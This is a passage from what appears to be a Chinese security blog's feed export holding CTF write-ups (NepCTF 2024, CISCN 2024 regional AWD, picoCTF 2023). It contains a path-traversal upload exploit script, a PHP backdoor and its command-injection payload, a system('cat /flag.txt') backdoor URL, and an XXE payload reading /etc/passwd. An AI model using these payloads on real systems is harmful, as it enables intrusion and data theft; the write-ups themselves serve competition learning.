class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Error creating POC file: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">zipPocFile</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> zipfile.ZipFile(<span class="hljs-string">&#x27;charsets.zip&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> zipf:<br>            zipf.write(<span class="hljs-string">&#x27;charsets.jar&#x27;</span>, compress_type=zipfile.ZIP_DEFLATED)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] POC file zipped successfully.&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Error creating ZIP file: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">zipToByteArray</span>(<span class="hljs-params">zipFilePath</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(zipFilePath, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> zipFile:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] ZIP file converted to byte array.&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">list</span>(zipFile.read())<br>    <span class="hljs-keyword">except</span> FileNotFoundError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] ZIP file not found: <span class="hljs-subst">&#123;zipFilePath&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Error reading ZIP file: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">uploadPackage</span>(<span class="hljs-params">url, repoName, packageName, version, packageFileAsBytes</span>):<br>    uploadRequest = &#123;<br>        <span class="hljs-string">&quot;repoName&quot;</span>: repoName,<br>        <span class="hljs-string">&quot;name&quot;</span>: packageName,<br>        <span class="hljs-string">&quot;version&quot;</span>: version,<br>        <span class="hljs-string">&quot;extension&quot;</span>: <span class="hljs-string">&quot;zip&quot;</span>,<br>        <span class="hljs-string">&quot;packageFileAsBytes&quot;</span>: packageFileAsBytes<br>    &#125;<br>    <br>    headers = &#123;<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span><br>    &#125;<br>    <br>    <span class="hljs-keyword">try</span>:<br>        response = requests.post(url, headers=headers, data=json.dumps(uploadRequest), timeout=<span class="hljs-number">10</span>, verify=<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">return</span> response, uploadRequest<br>    <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Error sending request to <span class="hljs-subst">&#123;url&#125;</span>: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Unexpected error: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    logo()<br>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&#x27;Upload a package to the server.&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-t&#x27;</span>, <span class="hljs-string">&#x27;--target&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>,default=<span class="hljs-string">&quot;https://neptune-46711.nepctf.lemonprefect.cn&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;The target to scan (e.g., http://192.168.1.1).&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;--port&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>, default=<span class="hljs-number">443</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;The port on the target (default: 80).&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-r&#x27;</span>, <span class="hljs-string">&#x27;--repoName&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, default=<span class="hljs-string">&quot;local&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;The repository name (default: local).&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-n&#x27;</span>, <span class="hljs-string">&#x27;--packageName&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, default=<span class="hljs-string">&quot;../../../../layers/paketo-buildpacks_bellsoft-liberica/jre/lib&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;The name of the package (default: ../../../poc).&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-v&#x27;</span>, <span class="hljs-string">&#x27;--version&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, default=<span class="hljs-string">&quot;1.0.0&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;The version of the package (default: 1.0.0).&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-f&#x27;</span>, <span class="hljs-string">&#x27;--file&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;A file containing a list of targets to scan in the format &quot;http://target,port&quot;.&#x27;</span>)<br><br>    args = parser.parse_args()<br><br>    targets = []<br>    <br>    <span class="hljs-keyword">if</span> args.file:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(args.file, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                targets = [line.strip().split(<span class="hljs-string">&#x27;,&#x27;</span>) <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f.readlines()]<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Targets loaded from file.&quot;</span>)<br>        <span class="hljs-keyword">except</span> FileNotFoundError:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] File not found: <span class="hljs-subst">&#123;args.file&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Error reading file <span class="hljs-subst">&#123;args.file&#125;</span>: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">elif</span> args.target:<br>        targets = [(args.target, args.port)]<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Please provide either a target with -t or a file with targets using -f.&quot;</span>)<br>    <br>    <span class="hljs-keyword">for</span> target, port <span class="hljs-keyword">in</span> targets:<br>        zipPocFile()<br>        packageFileAsBytes = zipToByteArray(<span class="hljs-string">&#x27;charsets.zip&#x27;</span>)<br>        <span class="hljs-keyword">if</span> packageFileAsBytes <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">continue</span><br>        <br>        url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;target&#125;</span>:<span class="hljs-subst">&#123;port&#125;</span>/api/package/upload&quot;</span><br>        response, requestBody = uploadPackage(url, args.repoName, args.packageName, args.version, packageFileAsBytes)<br>        <br>        <span class="hljs-keyword">if</span> response <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">continue</span><br>        <br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">500</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;Package is expected to be unpacked, but it doesn&#x27;t exist&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Target <span class="hljs-subst">&#123;target&#125;</span> is vulnerable.&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Target <span class="hljs-subst">&#123;target&#125;</span> is not vulnerable.&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Status Code: <span class="hljs-subst">&#123;response.status_code&#125;</span>&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Response Body: <span class="hljs-subst">&#123;response.text&#125;</span>&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Request Body: <span class="hljs-subst">&#123;json.dumps(requestBody, indent=<span class="hljs-number">4</span>)&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Error analyzing response from <span class="hljs-subst">&#123;url&#125;</span>: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <br>    <span class="hljs-keyword">try</span>:<br>        os.remove(<span class="hljs-string">&#x27;charsets.zip&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Cleanup successful.&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Error cleaning up files: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>然后触发漏洞</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/api</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>neptune-46711.nepctf.lemonprefect.cn<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html;charset=GBK<br><br><br></code></pre></td></tr></table></figure><img src="/2024/08/26/2024NepCTF/8.jpg" class=""><h1 id="neprouper赛后"><a class="markdownIt-Anchor" href="#neprouper赛后"></a> Neprouper（赛后）</h1><h2 id="neprouter-狸猫换太子"><a class="markdownIt-Anchor" href="#neprouter-狸猫换太子"></a> NepRouter-狸猫换太子</h2><p>5000端口，注册一个用户，会发现不管填什么都会自动显示成TEST，然后注册的时候会发送一个encrypted_id是加密的内容，很明显是前端加密，所以可以将TEST在前端修改成自己设的，如admin，然后注册，进去之后可以下载一个ELF文件，点about_us会跳到8080端口，一个登录框</p><p>下下来放进ida分析</p><img src="/2024/08/26/2024NepCTF/9.jpg" class=""><p>经过测试可以发现这是8080登录的逻辑判断，需要用户是NepNepIStheBestTeam</p><p>所以在5000端口注册用户为NepNepIStheBestTeam，</p><img src="/2024/08/26/2024NepCTF/10.jpg" class=""><p>然后注册，再点about_us，以NepNepIStheBestTeam登录会跳转到路由配置中心</p><p>可以测试到输入ip的地方可以RCE，那就反弹个shell</p><p>有空格就没成功，所以用base64编码绕过</p><img src="/2024/08/26/2024NepCTF/11.jpg" class=""><img src="/2024/08/26/2024NepCTF/12.jpg" class=""><p>NepCTF{You_93t_Me_But_Now_just_start}</p><h2 id="neprouter-白给"><a class="markdownIt-Anchor" href="#neprouter-白给"></a> NepRouter-白给</h2><p>在反编译那里可以看到数据库看到账号密码，比赛时直接用Mysql命令连接。</p><p>赛后出题人说不行，他做了设置，需要用python或go写脚本连或者navicat连，然而写脚本和navicat试了都连不上。</p><img src="/2024/08/26/2024NepCTF/13.jpg" class=""><p>估计这题也有点无语。</p>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024ciscn华南分区赛</title>
    <link href="/2024/06/10/2024ciscn%E5%8D%8E%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B/"/>
    <url>/2024/06/10/2024ciscn%E5%8D%8E%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>国赛华南分区赛——桂林之旅</p><p>拿了个二等奖，国赛就到这了，还是太菜了</p><p>除了前面利用ssh抢先拿了几个flag，然后利用后门收了一波，后面由于没有做权限维持，其他队伍又修了洞就开始掉分了，还好最后pwn手解出来了挽回一些分数冲了二等。由于环境出了问题，本来10点应该开始的比赛等到12点多才开始，而且比赛没有延时，也就是从6个小时变成了4个小时。题目web的java和pwn裁判说出题人权限没设好导致基本没办法fix，只能攻不能守。java题居然是初赛原题，可惜初赛java没来得及看，java很久才和本地打通，但这个时候已经被人搅屎了，全场的java主机ssh都被定时断开失联，导致java还没利用到就结束了。不过也让我们后面免受其他队的挨打，只受到一两个队的挨打。</p><p>这次的php题目是预留了两个后门，一个是一句话木马，一个是通过反射调用create_function来执行命令</p><p>访问后门的很简单，D盾就能扫出来，很多队都修了，剩下几个没修的</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/Home/</span>template<span class="hljs-regexp">/default/</span>adminpanel.php?backdoor=system(<span class="hljs-string">&quot;cat /flag.txt&quot;</span>);<br></code></pre></td></tr></table></figure><p>另一个后门就比较难发现，当时也是没发现，然后被人利用后种了不死马</p><p>赛后复现发现其实利用也很简单，当时要是仔细审代码也许能够发现这个后门，都把时间花在java上了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//去除报错</span><br><span class="hljs-comment">#error_reporting(0);</span><br><span class="hljs-comment">//设置超时</span><br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">300</span>);<br><span class="hljs-comment">//全局变量</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">go</span> </span>&#123;<br><br>    <span class="hljs-comment">//password</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span> = <span class="hljs-string">&quot;command&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkPass</span>())&#123;<br>            <span class="hljs-variable">$param</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parser</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">getData</span>()-&gt;data);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$param</span>)&#123;<br>                <span class="hljs-variable">$instance</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TLKNQWFlogin</span>();<br>                <span class="hljs-variable">$reflectionClass</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionClass</span>(<span class="hljs-string">&#x27;TLKNQWFlogin&#x27;</span>);<br>                <span class="hljs-variable">$reflectionProperty</span> = <span class="hljs-variable">$reflectionClass</span>-&gt;<span class="hljs-title function_ invoke__">getProperty</span>(<span class="hljs-variable">$instance</span>-&gt;func);<br>                <span class="hljs-variable">$reflectionProperty</span>-&gt;<span class="hljs-title function_ invoke__">setAccessible</span>(<span class="hljs-literal">true</span>);<br>                <span class="hljs-variable">$command</span> = <span class="hljs-variable">$reflectionProperty</span>-&gt;<span class="hljs-title function_ invoke__">getValue</span>(<span class="hljs-variable">$instance</span>);<br>                <span class="hljs-variable">$reflectionMethod</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionFunction</span>(<span class="hljs-variable">$command</span>);<br>                <span class="hljs-variable">$result</span> = <span class="hljs-variable">$reflectionMethod</span>-&gt;<span class="hljs-title function_ invoke__">invoke</span>(<span class="hljs-variable">$param</span>,<span class="hljs-string">&quot;_&quot;</span>);<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;parser is wrong!&quot;</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;pass is wrong!&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">#检查key</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkPass</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-variable language_">$this</span>-&gt;pass]))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-comment">//获取请求数据</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getData</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;data = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-variable language_">$this</span>-&gt;pass];<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>;<br>    &#125;<br>    <span class="hljs-comment">// //解析参数加密</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parser</span>(<span class="hljs-params"><span class="hljs-variable">$param</span></span>)</span>&#123;<br>        <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$param</span>);<br>        <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$data</span>,<span class="hljs-number">0</span>,<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;pass));<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$key</span> == <span class="hljs-variable language_">$this</span>-&gt;pass)&#123;<br>            <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">substr_replace</span>(<span class="hljs-variable">$data</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;pass));<br>            <span class="hljs-variable language_">$this</span>-&gt;data = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$data</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$data</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">calc</span>(<span class="hljs-params"><span class="hljs-variable">$password</span>,<span class="hljs-variable">$func</span></span>)</span>&#123;<br>    <span class="hljs-variable">$functions</span> = <span class="hljs-variable">$func</span>(<span class="hljs-string">&#x27;$a&#x27;</span>, <span class="hljs-string">&quot;echo <span class="hljs-subst">$password</span>&quot;</span>);<br>    <span class="hljs-variable">$functions</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Command&quot;</span>;<br>    &#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TLKNQWFlogin</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$command</span>;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;command&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;command = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$param</span>,<span class="hljs-variable">$magic</span></span>) </span>&#123;  <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">calc</span>(<span class="hljs-variable">$param</span>.<span class="hljs-string">&#x27;exit();&#x27;</span>,<span class="hljs-string">&quot;create&quot;</span>.<span class="hljs-variable">$magic</span>.<span class="hljs-string">&quot;function&quot;</span>) ; &#125;;<br>        <br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">go</span>();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">run</span>();<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$command</span>=<span class="hljs-string">&quot;1;&#125;system(&#x27;whoami&#x27;);/*&quot;</span>;<br><span class="hljs-variable">$command</span>=<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$command</span>);<br><span class="hljs-variable">$str</span>=<span class="hljs-string">&quot;command&quot;</span>.<span class="hljs-variable">$command</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$str</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost<span class="hljs-regexp">/html/</span>A<span class="hljs-regexp">/t/</span>tpl<span class="hljs-regexp">/common/</span>Command.php?command=Y29tbWFuZE1UdDljM2x6ZEdWdEtDZDNhRzloYldrbktUc3ZLZz09<br></code></pre></td></tr></table></figure><p>这里直接访问是因为admin.php的路由里面写了<code>/A/t/tpl</code>下面是静态文件，</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>定义静态文件路径<br>define(<span class="hljs-string">&#x27;Tpl_style&#x27;</span>,<span class="hljs-string">&#x27;/A/t/tpl&#x27;</span>);<br></code></pre></td></tr></table></figure><p>静态文件是可以直接通过路径访问到的</p><p>此次比赛深刻教训：要去学学怎么种不死马维持权限， 不然只能拿到前面几轮的flag后面基本就只有挨打的份了。</p>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>picoCTF2023</title>
    <link href="/2023/03/20/picoCTF2023/"/>
    <url>/2023/03/20/picoCTF2023/</url>
    
    <content type="html"><![CDATA[<h3 id="0x00findme"><a class="markdownIt-Anchor" href="#0x00findme"></a> 0x00findme</h3><p>重定向页面有base64编码：cGljb0NURntwcm94aWVzX2FsbF90aGVfd2F5XzM5Mjg2Yzk3fQ==  （要两次才能凑齐）</p><p>解码后得到<code>picoCTF&#123;proxies_all_the_way_39286c97&#125;</code></p><img src="/2023/03/20/picoCTF2023/1.png" class=""><h3 id="0x01matchtheregex"><a class="markdownIt-Anchor" href="#0x01matchtheregex"></a> 0x01MatchTheRegex</h3><p>考一个正则匹配，查看页面源码可以看到匹配内容</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">send_request</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">let</span> val = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;name&quot;</span>).<span class="hljs-property">value</span>;<br><span class="hljs-comment">// ^p.....F!?</span><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/flag?input=<span class="hljs-subst">$&#123;val&#125;</span>`</span>)<br>.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">text</span>())<br>.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br><span class="hljs-keyword">const</span> res_json = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(res);<br><span class="hljs-title function_">alert</span>(res_json.<span class="hljs-property">flag</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输入<code>picoCTF</code>即可</p><img src="/2023/03/20/picoCTF2023/2.png" class=""><h3 id="0x02soap"><a class="markdownIt-Anchor" href="#0x02soap"></a> 0x02SOAP</h3><p>提示是XML外部实体注入,并且要读取/etc/passwd文件</p><p>抓包可以发现点击<code>Details</code>之后有xml</p><p>直接进行注入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">data</span>[</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ID</span>&gt;</span><br>        <span class="hljs-symbol">&amp;xxe;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">ID</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span><br></code></pre></td></tr></table></figure><img src="/2023/03/20/picoCTF2023/3.png" class=""><h3 id="0x03more-sqli"><a class="markdownIt-Anchor" href="#0x03more-sqli"></a> 0x03More SQLi</h3><p>sql注入,常规试一下</p><img src="/2023/03/20/picoCTF2023/4.png" class=""><p>发现是password and username,所以注入点应该在password</p><img src="/2023/03/20/picoCTF2023/5.png" class=""><h3 